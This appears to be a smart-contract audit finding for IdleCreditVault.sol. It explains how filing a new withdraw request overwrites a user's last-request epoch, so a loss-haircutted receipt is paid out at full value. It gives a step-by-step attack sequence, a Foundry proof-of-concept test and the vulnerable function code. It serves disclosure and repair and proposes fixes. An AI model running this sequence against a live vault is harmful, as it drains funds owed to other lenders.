The external bug is a dispatch-precedence failure: a specific implementation becomes unavailable, so execution silently falls through to a generic default. In `IdleCreditVault.claimWithdrawRequest`, the loss-adjusted claim path is keyed only to `lastWithdrawRequest[_user]`; a newer request epoch shadows an older haircutted epoch, so the haircutted receipt falls through to the par-funded handler.

### Title
New withdraw request shadows a pending loss-adjusted epoch receipt, letting the user claim it at par - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`claimWithdrawRequest` dispatches to `_claimLossAdjustedWithdrawRequest`, which resolves the loss epoch as `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]` — a single-slot pointer. If a user holds a haircutted receipt in epoch A (created via `stopEpochWithDuration`/`collectWithdrawFunds` partial funding) and then files a new `requestWithdraw` in epoch B, `lastWithdrawRequest[_user]` is overwritten to B. `lossRecoveryPriceByEpoch[B]` is 0, so the loss-adjusted handler returns 0, and `_claimFundedWithdrawRequest` pays the entire aggregate `withdrawsRequests[_user]` — including the haircutted epoch-A basis — at par.

### Finding Description
- `requestWithdraw` accumulates into `withdrawsRequests[_user]`/`withdrawsRequestsByEpoch[_user][currentEpoch]` and unconditionally sets `lastWithdrawRequest[_user] = currentEpoch`, with no check for prior unclaimed receipts ( [1](#0-0) ).
- `collectWithdrawFunds` with `_amount < pendingBasis` records `lossRecoveryPriceByEpoch[epoch]` and zeroes `pendingWithdraws`, but per-user `withdrawsRequestsByEpoch`/`withdrawsRequests` retain the full pre-haircut basis ( [2](#0-1) ).
- `_claimLossAdjustedWithdrawRequest` only probes `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]`; for any other epoch it returns 0 without clearing ( [3](#0-2) ).
- `_claimFundedWithdrawRequest` then pays `withdrawsRequests[_user]` in full once `epochNumber > lastWithdrawRequest[_user]`, burning receipt tokens 1:1 and calling `_transferFundedClaim` ( [4](#0-3) ).

Attack sequence (attacker = KYC-passed lender, all privileged calls honest):
1. Epoch A running: attacker calls `requestWithdraw` → basis `X`, `lastWithdrawRequest = A`, `withdrawsRequestsByEpoch[attacker][A] = X`.
2. Manager stops epoch A via `stopEpochWithDuration(..., _lossAmount)` and the borrower partially funds receipts: `collectWithdrawFunds(funded < pendingBasis)` sets `lossRecoveryPriceByEpoch[A] = r < RECOVERY_FULL`, `pendingWithdraws = 0`. Only `funded` underlying reached the vault for all epoch-A receipts.
3. Attacker does not claim. In epoch B (after `startEpoch`) they call `requestWithdraw` again with any dust amount `ε`. `lastWithdrawRequest` becomes B; `withdrawsRequests[attacker] = X + ε`.
4. Epoch B stops normally and is fully funded. Attacker calls `claimWithdrawRequest`:
   - `_claimLossAdjustedWithdrawRequest`: `lossRecoveryPriceByEpoch[B] == 0` → returns 0, nothing cleared.
   - `_claimFundedWithdrawRequest`: `epochNumber > B` → pays `X + ε` at par.
   The epoch-A receipt that was only funded at `r` is redeemed for `X`, extracting `X − X·r/RECOVERY_FULL` more than funded.

### Impact Explanation
Direct theft/insolvency: the attacker withdraws `X·(1 − r)/RECOVERY_FULL` underlying that was never funded, draining underlying earmarked for other pending/funded claimants. The "one receipt one (haircutted) payout" invariant is broken. Loss scales with the attacker's epoch-A request size and the haircut depth; e.g., a 50% haircut on a 1M receipt yields a ~500k excess payout.

### Likelihood Explanation
Requires only that the attacker holds an unclaimed receipt through a partial-loss stop and then re-requests in a later epoch — both are normal, permissionless user actions, and stacking requests is explicitly supported by the code comments. Triggering the partial-loss path requires a real borrower funding shortfall processed via `stopEpochWithDuration`/`collectWithdrawFunds`, which is an honest-manager flow the attacker sequences around, not controls — hence medium likelihood.

### Recommendation
Make the loss-adjusted lookup independent of `lastWithdrawRequest`: either iterate/record per-user epochs carrying a `lossRecoveryPriceByEpoch` entry (e.g., store the loss epoch on the receipt, or track `lossEpochByUser`), or revert in `requestWithdraw` when the user has an unclaimed receipt in an epoch with a nonzero `lossRecoveryPriceByEpoch`. At minimum, `_claimFundedWithdrawRequest` should subtract any per-epoch basis whose epoch has a nonzero loss recovery price and pay it at that price instead of par.

### Proof of Concept
Foundry fork PoC (sketch) on the credit-vault deployment, extending `test/foundry/IdleCreditVault.t.sol` helpers:

```solidity
function testLossAdjustedEpochShadowedByNewRequest() external {
    address attacker = makeAddr('attacker');
    uint256 amount = 100_000 * ONE_SCALE;

    // epoch A: deposit + request withdraw
    _depositWithUser(attacker, amount, true);
    vm.prank(attacker);
    uint256 claim = cdoEpoch.requestWithdraw(0, address(AAtranche)); // basis X
    uint256 epochA = strategy.epochNumber();

    // stop epoch A with a loss so receipts are only partially funded
    _startEpochAndCheckPrices(0);
    uint256 pendingBasis = strategy.pendingWithdraws();
    // borrower funds only half of pendingBasis via stopEpochWithDuration + collectWithdrawFunds
    uint256 interest = cdoEpoch.expectedEpochInterest();
    uint256 lossAmount = pendingBasis / 2; // allocate loss fully onto pending receipts
    address borrower = strategy.borrower();
    deal(defaultUnderlying, borrower, interest + pendingBasis / 2);
    vm.prank(borrower);
    IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), interest + pendingBasis / 2);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(0, interest, cdoEpoch.epochDuration(), lossAmount);
    assertGt(strategy.lossRecoveryPriceByEpoch(epochA), 0, 'no loss price recorded');

    // epoch B: attacker re-requests a dust withdraw, overwriting lastWithdrawRequest
    vm.prank(manager);
    cdoEpoch.startEpoch();
    _depositWithUser(attacker, ONE_SCALE, true);
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(0, address(AAtranche)); // dust epsilon

    // stop epoch B fully funded
    _stopEpochAndCheckPrices(1, initialProvidedApr, _expectedFundsEndEpoch());

    // claim: loss-adjusted path probes epoch B (no price) -> funded path pays X + eps at par
    uint256 balPre = IERC20Detailed(defaultUnderlying).balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 paid = IERC20Detailed(defaultUnderlying).balanceOf(attacker) - balPre;

    // expected honest payout: claim * lossRecoveryPriceByEpoch[epochA] / RECOVERY_FULL + dust
    uint256 price = strategy.lossRecoveryPriceByEpoch(epochA);
    assertGt(paid, claim * price / 1e18, 'haircut bypassed, receipt paid at par');
}
```

Key assertion: `paid` equals the full `claim` (plus dust) even though `lossRecoveryPriceByEpoch[epochA] < RECOVERY_FULL`, while the strategy only received `pendingBasis/2` for epoch-A receipts — demonstrating overpayment funded by other claimants' reserves.

  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);

  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
  }
